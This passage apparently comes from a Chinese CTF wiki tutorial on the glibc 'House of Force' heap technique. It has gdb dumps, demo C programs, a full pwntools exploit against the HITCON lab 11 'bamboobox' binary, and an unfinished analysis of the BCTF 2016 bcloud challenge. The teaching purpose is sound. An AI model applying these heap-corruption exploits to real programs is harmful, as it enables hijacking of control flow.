0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x0000000000602020 <=== top chunk\u6b64\u65f6\u4e00\u5207\u6b63\u5e38 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 \u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884c malloc(-4120); \uff0c-4120\u662f\u600e\u4e48\u5f97\u51fa\u7684\u5462\uff1f \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u8981\u5199\u5165\u7684\u76ee\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u7f16\u8bd1\u7a0b\u5e8f\u540e\uff0c0x601020 \u662f malloc@got.plt \u7684\u5730\u5740 0x601020: 0x00007ffff7a91130 <=== malloc@got.plt \u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c06 top chunk \u6307\u5411 0x601010 \u5904\uff0c\u8fd9\u6837\u5f53\u4e0b\u6b21\u518d\u5206\u914d chunk \u65f6\uff0c\u5c31\u53ef\u4ee5\u5206\u914d\u5230 malloc@got.plt \u5904\u7684\u5185\u5b58\u4e86\u3002 \u4e4b\u540e\u660e\u786e\u5f53\u524d top chunk \u7684\u5730\u5740\uff0c\u6839\u636e\u524d\u9762\u63cf\u8ff0\uff0ctop chunk \u4f4d\u4e8e 0x602020\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5982\u4e0b 0x601010-0x602020=-4112 \u6b64\u5916\uff0c\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u7684\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\u3002 void * __libc_malloc ( size_t bytes ) { \u5982\u679c\u60f3\u8981\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u7ecf\u8fc7\u5185\u90e8\u7684 checked_request2size \u53ef\u4ee5\u5f97\u5230\u8fd9\u6837\u7684\u5927\u5c0f\uff0c\u5373 /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u4e00\u65b9\u9762\uff0c\u6211\u4eec\u9700\u8981\u7ed5\u8fc7 REQUEST_OUT_OF_RANGE(req) \u8fd9\u4e2a\u68c0\u6d4b\uff0c\u5373\u6211\u4eec\u4f20\u7ed9 malloc \u7684\u503c\u5728\u8d1f\u6570\u8303\u56f4\u5185\uff0c\u4e0d\u5f97\u5927\u4e8e -2 * MINSIZE\uff0c\u8fd9\u4e2a\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u53ef\u4ee5\u6ee1\u8db3\u7684\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5728\u6ee1\u8db3\u5bf9\u5e94\u7684\u7ea6\u675f\u540e\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 request2size \u6b63\u597d\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK \u6070\u597d\u4e3a-4112\u3002\u9996\u5148\uff0c\u5f88\u663e\u7136\uff0c-4112 \u662f chunk \u5bf9\u9f50\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u5c06\u5176\u5206\u522b\u51cf\u53bb SIZE_SZ\uff0cMALLOC_ALIGN_MASK \u5c31\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u9700\u8981\u7533\u8bf7\u7684\u503c\u3002\u5176\u5b9e\u6211\u4eec\u8fd9\u91cc\u53ea\u9700\u8981\u51cf SIZE_SZ \u5c31\u53ef\u4ee5\u4e86\uff0c\u56e0\u4e3a\u591a\u51cf\u7684 MALLOC_ALIGN_MASK \u6700\u540e\u8fd8\u4f1a\u88ab\u5bf9\u9f50\u6389\u3002\u800c \u5982\u679c -4112 \u4e0d\u662f MALLOC_ALIGN \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u591a\u51cf\u4e00\u4e9b\u4e86\u3002\u5f53\u7136\uff0c\u6211\u4eec\u6700\u597d\u4f7f\u5f97\u5206\u914d\u4e4b\u540e\u5f97\u5230\u7684 chunk \u4e5f\u662f\u5bf9\u9f50\u7684\uff0c\u56e0\u4e3a\u5728\u91ca\u653e\u4e00\u4e2a chunk \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u884c\u5bf9\u9f50\u68c0\u67e5\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u5f53\u8c03\u7528 malloc(-4120) \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u88ab\u62ac\u9ad8\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f4d\u7f6e 0x7ffff7dd1b20 <main_arena>:\\ 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x0000000000601010 <=== \u53ef\u4ee5\u89c2\u5bdf\u5230top chunk\u88ab\u62ac\u9ad8 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 \u4e4b\u540e\uff0c\u6211\u4eec\u5206\u914d\u7684\u5757\u5c31\u4f1a\u51fa\u73b0\u5728 0x601010+0x10 \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f 0x601020 \u53ef\u4ee5\u66f4\u6539 got \u8868\u4e2d\u7684\u5185\u5bb9\u4e86\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u88ab\u62ac\u9ad8\u7684\u540c\u65f6\uff0cmalloc@got \u9644\u8fd1\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u4fee\u6539\u3002 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); \u7b80\u5355\u793a\u4f8b2 \u00b6 \u5728\u4e0a\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u6f14\u793a\u4e86\u901a\u8fc7 HOF \u4f7f\u5f97 top chunk \u7684\u6307\u9488\u51cf\u5c0f\u6765\u4fee\u6539\u4f4d\u4e8e\u5176\u4e0a\u9762(\u4f4e\u5730\u5740)\u7684got\u8868\u4e2d\u7684\u5185\u5bb9\uff0c \u4f46\u662f HOF \u5176\u5b9e\u4e5f\u53ef\u4ee5\u4f7f\u5f97 top chunk \u6307\u9488\u589e\u5927\u6765\u4fee\u6539\u4f4d\u4e8e\u9ad8\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u793a\u4f8b\u6765\u6f14\u793a\u8fd9\u4e00\u70b9 int main() { long *ptr,*ptr2; ptr=malloc(0x10); ptr=(long *)(((long)ptr)+24); *ptr=-1; <=== \u4fee\u6539top chunk size malloc(140737345551056); <=== \u589e\u5927top chunk\u6307\u9488 malloc(0x10); } \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4ee3\u7801\u4e0e\u7b80\u5355\u793a\u4f8b1\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u7b2c\u4e8c\u6b21 malloc \u7684 size \u6709\u6240\u4e0d\u540c\u3002 \u8fd9\u6b21\u6211\u4eec\u7684\u76ee\u6807\u662f malloc_hook\uff0c\u6211\u4eec\u77e5\u9053 malloc_hook \u662f\u4f4d\u4e8e libc.so \u91cc\u7684\u5168\u5c40\u53d8\u91cf\u503c\uff0c\u9996\u5148\u67e5\u770b\u5185\u5b58\u5e03\u5c40 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \u53ef\u4ee5\u770b\u5230 heap \u7684\u57fa\u5740\u5728 0x602000\uff0c\u800c libc \u7684\u57fa\u5740\u5728 0x7ffff7a0d000\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u901a\u8fc7 HOF \u6269\u5927 top chunk\u6307\u9488\u7684\u503c\u6765\u5b9e\u73b0\u5bf9 malloc_hook \u7684\u5199\u3002 \u9996\u5148\uff0c\u7531\u8c03\u8bd5\u5f97\u77e5 __malloc_hook \u7684\u5730\u5740\u4f4d\u4e8e 0x7ffff7dd1b10 \uff0c\u91c7\u53d6\u8ba1\u7b97 0x7ffff7dd1b00-0x602020-0x10=140737345551056 \u7ecf\u8fc7\u8fd9\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u7684\u5730\u5740\u88ab\u62ac\u9ad8\u5230\u4e86 0x00007ffff7dd1b00 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x00007ffff7dd1b00 <=== top chunk 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 \u4e4b\u540e\uff0c\u6211\u4eec\u53ea\u8981\u518d\u6b21\u5206\u914d\u5c31\u53ef\u4ee5\u63a7\u5236 0x7ffff7dd1b10 \u5904\u7684 __malloc_hook \u503c\u4e86 rax = 0x00007ffff7dd1b10 0x400562 <main+60> mov edi, 0x10 0x400567 <main+65> call 0x400410 <malloc@plt> \u5c0f\u603b\u7ed3 \u00b6 \u5728\u8fd9\u4e00\u8282\u4e2d\u8bb2\u89e3\u4e86 House Of Force \u7684\u539f\u7406\u5e76\u4e14\u7ed9\u51fa\u4e86\u4e24\u4e2a\u5229\u7528\u7684\u7b80\u5355\u793a\u4f8b\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e24\u4e2a\u7b80\u5355\u793a\u4f8b\u6211\u4eec\u4f1a\u53d1\u73b0\u5176\u5b9eHOF\u7684\u5229\u7528\u8981\u6c42\u8fd8\u662f\u76f8\u5f53\u82db\u523b\u7684\u3002 \u9996\u5148\uff0c\u9700\u8981\u5b58\u5728\u6f0f\u6d1e\u4f7f\u5f97\u7528\u6237\u80fd\u591f\u63a7\u5236 top chunk \u7684 size \u57df\u3002 \u5176\u6b21\uff0c \u9700\u8981\u7528\u6237\u80fd\u81ea\u7531\u63a7\u5236 malloc \u7684\u5206\u914d\u5927\u5c0f \u7b2c\u4e09\uff0c\u5206\u914d\u7684\u6b21\u6570\u4e0d\u80fd\u53d7\u9650\u5236 \u5176\u5b9e\u8fd9\u4e09\u70b9\u4e2d\u7b2c\u4e8c\u70b9\u5f80\u5f80\u662f\u6700\u96be\u529e\u7684\uff0cCTF \u9898\u76ee\u4e2d\u5f80\u5f80\u4f1a\u7ed9\u7528\u6237\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\u9650\u5236\u6700\u5c0f\u548c\u6700\u5927\u503c\u4f7f\u5f97\u4e0d\u80fd\u901a\u8fc7HOF \u7684\u65b9\u6cd5\u8fdb\u884c\u5229\u7528\u3002 HITCON training lab 11 \u00b6 \u8fd9\u91cc\uff0c\u6211\u4eec\u4e3b\u8981\u4fee\u6539\u5176 magic \u51fd\u6570\u4e3a \u57fa\u672c\u4fe1\u606f \u00b6 \u279c hitcontraning_lab11 git: ( master ) file bamboobox bamboobox: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped \u279c hitcontraning_lab11 git: ( master ) checksec bamboobox [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a 64 \u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5373\u7533\u8bf7\u4e86 0x10 \u7684\u5185\u5b58\uff0c\u7528\u6765\u4fdd\u7559 \u4e24\u4e2a\u51fd\u6570\u6307\u9488 \u3002 \u8be5\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u5bf9\u4e8e\u76d2\u5b50\u91cc\u7684\u7269\u54c1\u8fdb\u884c\u6dfb\u52a0\u548c\u5220\u9664 \u5c55\u793a\u76d2\u5b50\u91cc\u7684\u5185\u5bb9\uff0c\u4f9d\u6b21\u76d2\u5b50\u91cc\u6bcf\u4e00\u4e2a\u7269\u54c1\u7684\u540d\u5b57\u3002 \u5411\u76d2\u5b50\u91cc\u6dfb\u52a0\u7269\u54c1\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u4e3a\u6bcf\u4e00\u4e2a\u7269\u54c1\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u4f5c\u4e3a\u5176\u5b58\u50a8\u540d\u5b57\u7684\u7a7a\u95f4\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bfb\u53d6\u540d\u5b57\u4f7f\u7528\u7684\u662f read \u51fd\u6570\uff0c\u8bfb\u53d6\u957f\u5ea6\u7684\u53c2\u6570\u662f\u7528\u6237\u8f93\u5165\u7684 v2\uff0c\u800c read \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u8d1f\u6570\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u786e\u4fdd\u8be5\u6570\u503c\u6ee1\u8db3 REQUEST_OUT_OF_RANGE \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u8fd9\u91cc\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002\u4f46\u5373\u4f7f\u8fd9\u6837\uff0c\u7b2c\u4e00\u6b21\u7684\u65f6\u5019\u4e5f\u6bd4\u8f83\u96be\u4ee5\u5229\u7528\uff0c\u56e0\u4e3a\u521d\u59cb\u65f6\u5019\u5806\u7684 top chunk \u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e0d\u4f1a\u5f88\u5927\u7684\u3002 \u4fee\u6539\u7269\u54c1\u7684\u540d\u5b57\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\uff0c\u4ee5\u53ca\u5927\u5c0f\uff0c\u5411\u6307\u5b9a\u7d22\u5f15\u7684\u7269\u54c1\u4e2d\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u540d\u5b57\u3002\u8fd9\u91cc\u957f\u5ea6\u7531\u7528\u6237\u6765\u8bfb\u5165\uff0c\u4e5f\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002 \u5220\u9664\u7269\u54c1\uff0c\u5c06\u5bf9\u5e94\u7269\u54c1\u7684\u540d\u5b57\u7684\u5927\u5c0f\u7f6e\u4e3a0\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684 content \u7f6e\u4e3a NULL\u3002 \u6b64\u5916\uff0c\u7531\u4e8e\u8be5\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u6f14\u793a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 flag\u3002 \u5229\u7528 \u00b6 \u7531\u4e8e\u7a0b\u5e8f\u4e2d\u6709\u4e2a magic \u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u6838\u5fc3\u76ee\u7684\u662f\u8986\u76d6\u67d0\u4e2a\u6307\u9488\u4e3a magic \u51fd\u6570\u7684\u6307\u9488\u3002\u8fd9\u91cc\uff0c\u7a0b\u5e8f\u5728\u5f00\u59cb\u7684\u65f6\u5019\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\u6765\u5b58\u50a8\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0chello_message\u7528\u4e8e\u7a0b\u5e8f\u5f00\u59cb\u65f6\u4f7f\u7528\uff0cgoodbye_message \u7528\u4e8e\u5728\u7a0b\u5e8f\u7ed3\u675f\u65f6\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8986\u76d6 goodbye_message \u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b \u6dfb\u52a0\u7269\u54c1\uff0c\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 top chunk \u7684\u5927\u5c0f\u4e3a -1\uff0c\u5373 64 \u4f4d\u6700\u5927\u503c\u3002 \u5229\u7528 house of force \u6280\u5de7\uff0c\u5206\u914d chunk \u81f3\u5806\u7684\u57fa\u5730\u5740\u3002 \u8986\u76d6 goodbye_message \u4e3amagic \u51fd\u6570\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u89e6\u53d1top chunk \u8f6c\u79fb\u5230\u6307\u5b9a\u4f4d\u7f6e\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u5927\u5c0f\u5e94\u8be5\u5408\u9002\uff0c\u4ee5\u4fbf\u4e8e\u8bbe\u7f6e\u65b0\u7684 top chunk \u5927\u5c0f\uff0c\u4ece\u800c\u53ef\u4ee5\u7ed5\u8fc7\u4e0b\u4e00\u6b21\u5206\u914dtop chunk \u7684\u68c0\u6d4b\u3002 exp \u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './bamboobox' ) context.log_level = 'debug' def additem ( length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"2\" ) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def modify ( idx, length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"3\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def remove ( idx ) : r.recvuntil ( \":\" ) r.sendline ( \"4\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) def show () : r.recvuntil ( \":\" ) r.sendline ( \"1\" ) magic = 0x400d49 # we must alloc enough size, so as to successfully alloc from fake topchunk additem ( 0x30, \"ddaa\" ) # idx 0 payload = 0x30 * 'a' # idx 0's content payload += 'a' * 8 + p64 ( 0xffffffffffffffff ) # top chunk's prev_size and size # modify topchunk's size to -1 modify ( 0 , 0x41, payload ) # top chunk's offset to heap base offset_to_heap_base = - ( 0x40 + 0x20 ) malloc_size = offset_to_heap_base - 0x8 - 0xf #gdb.attach(r) additem ( malloc_size, \"dada\" ) additem ( 0x10, p64 ( magic ) * 2 ) print r.recv () r.interactive () \u5f53\u7136\uff0c\u8fd9\u4e00\u9898\u4e5f\u53ef\u4ee5\u4f7f\u7528 unlink \u7684\u65b9\u6cd5\u6765\u505a\u3002 2016 BCTF bcloud \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c 2016_bctf_bcloud git: ( master ) file bcloud bcloud: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped \u279c 2016_bctf_bcloud git: ( master ) checksec bcloud [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 32 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u4e91\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\u3002\u9996\u5148\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8bbe\u7f6e\u7528\u6237\u7684\u540d\u5b57\uff0c\u7ec4\u7ec7\uff0chost\u3002\u7a0b\u5e8f\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd \u65b0\u5efanote\uff0c\u6839\u636e\u7528\u6237\u7684\u8f93\u5165x\u7533\u8bf7x+4\u7684\u7a7a\u95f4\u4f5c\u4e3anote\u7684\u5927\u5c0f\u3002 \u5c55\u793anote\uff0c\u5565\u529f\u80fd\u4e5f\u6ca1\u6709\u3002\u3002 \u7f16\u8f91note\uff0c\u6839\u636e\u7528\u6237\u6307\u5b9a\u7684 note \u7f16\u8f91\u5bf9\u5e94\u7684\u5185\u5bb9\u3002 \u5220\u9664note\uff0c\u5220\u9664\u5bf9\u5e94note\u3002 \u540c\u6b65note\uff0c\u6807\u8bb0\u6240\u6709\u7684note\u5df2\u7ecf\u88ab\u540c\u6b65\u3002 \u7136\u800c\u5728\u8fd9\u4e94\u4e2a\u529f\u80fd\u4e2d\u5e76\u6ca1\u6709\u53d1\u73b0\u5565\u6f0f\u6d1e\uff0c\uff0c\uff0c\u91cd\u65b0\u770b\u7a0b\u5e8f\uff0c\u7ed3\u679c\u53d1\u73b0\u7a0b\u5e8f\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6f0f\u6d1e\u3002\u3002 \u521d\u59cb\u5316\u540d\u5b57 unsigned int init_name () { char s ; // [esp+1Ch] [ebp-5Ch] char * tmp ; // [esp+5Ch] [ebp-1Ch] unsigned int v3 ; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x50u ); puts ( \"Input your name:\" ); read_str ( & s , 64 , '\\n' ); tmp = ( char * ) malloc ( 0x40u ); name = tmp ; strcpy ( tmp , & s ); info ( tmp ); return __readgsdword ( 0x14u ) ^ v3 ; } \u8fd9\u91cc\u5982\u679c\u7a0b\u5e8f\u8bfb\u5165\u7684\u540d\u5b57\u4e3a64\u4e2a\u5b57\u7b26\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u5728\u4f7f\u7528info\u51fd\u6570\u8f93\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u65f6\uff0c\u5c31\u4f1a\u8f93\u51fa\u5bf9\u5e94\u7684tmp\u6307\u9488\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u8bf4 \u6cc4\u9732\u4e86\u5806\u7684\u5730\u5740 \u3002\u3002 \u521d\u59cb\u5316\u7ec4\u7ec7\u548corg\u7684\u65f6\u5019\u5b58\u5728\u6f0f\u6d1e unsigned int init_org_host () { char s ; // [esp+1Ch] [ebp-9Ch] char * v2 ; // [esp+5Ch] [ebp-5Ch] char v3 ; // [esp+60h] [ebp-58h] char * v4 ; // [esp+A4h] [ebp-14h] unsigned int v5 ; // [esp+ACh] [ebp-Ch] v5 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x90u ); puts ( \"Org:\" ); read_str ( & s , 64 , 10 ); puts ( \"Host:\" ); read_str ( & v3 , 64 , 10 ); v4 = ( char * ) malloc ( 0x40u ); v2 = ( char * ) malloc ( 0x40u ); org = v2 ; host = v4 ; strcpy ( v4 , & v3 ); strcpy ( v2 , & s ); puts ( \"OKay! Enjoy:)\" ); return __readgsdword ( 0x14u ) ^ v5 ; } \u5f53\u8bfb\u5165\u7ec4\u7ec7\u65f6\uff0c\u7ed9\u5b9a 64 \u5b57\u8282\uff0c\u4f1a\u8986\u76d6 v2 \u7684\u4f4e\u5730\u5740\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 v2 \u662f\u4e0e top chunk \u76f8\u90bb\u7684 chunk\uff0c\u800c v2 \u6070\u597d\u4e0e org \u76f8\u90bb\uff0c\u90a3\u4e48\u7531\u4e8e\u5728 32 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u822c\u90fd\u662f 32 \u4f4d\u5168\u90e8\u90fd\u4f7f\u7528\uff0c\u8fd9\u91cc v2 \u6240\u5b58\u50a8\u7684\u5185\u5bb9\uff0c\u51e0\u4e4e\u5f88\u5927\u7a0b\u5ea6\u4e0a\u90fd\u4e0d\u662f \\x00 \uff0c\u6240\u4ee5\u5f53\u6267\u884c strcpy \u51fd\u6570\u5411 v2 \u4e2d\u62f7\u8d1d\u5185\u5bb9\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u8986\u76d6top chunk\u3002\u8fd9\u5c31\u662f\u6f0f\u6d1e\u6240\u5728\u3002 \u5229\u7528 \u00b6 \u5229\u7528\u521d\u59cb\u5316\u540d\u5b57\u5904\u7684\u6f0f\u6d1e\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\u3002\u3002 \u5229\u7528 house of force \u5c06 top chunk \u5206\u914d\u81f3\u5168\u5c40\u7684 0x0804B0A0 \u7684 &notesize-8 \u5904\uff0c\u5f53\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u4fbf\u8fd4\u56denotesize\u5730\u5740\u5904\u7684\u5185\u5b58\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6240\u6709note\u7684\u5927\u5c0f\u4ee5\u53ca\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002 